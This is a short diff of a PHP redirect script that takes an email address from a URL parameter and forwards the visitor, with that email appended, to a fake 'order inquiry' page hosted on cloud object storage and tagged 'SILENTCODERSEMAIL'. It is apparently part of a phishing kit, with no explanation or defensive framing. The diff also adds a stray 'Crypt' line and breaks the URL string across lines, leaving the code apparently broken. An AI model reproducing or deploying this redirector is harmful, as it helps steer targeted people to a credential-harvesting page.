@@ -1,3 +1,5 @@
+Crypt
+
 <?php
 function getemIDFromem($em)
 {
@@ -9,4 +11,5 @@ return $emID;
 $em = $_GET['em'];
 $emID = getemIDFromem($em);
 header("Location: https://cloud-object-storage-60-cos-static-web-hosting-dvr.s3.us-east.cloud-object-storage.appdomain.cloud/butbox2019_ORDER_INQ_328Y389.html?#SILENTCODERSEMAIL
+/?em=$em");
 ?>
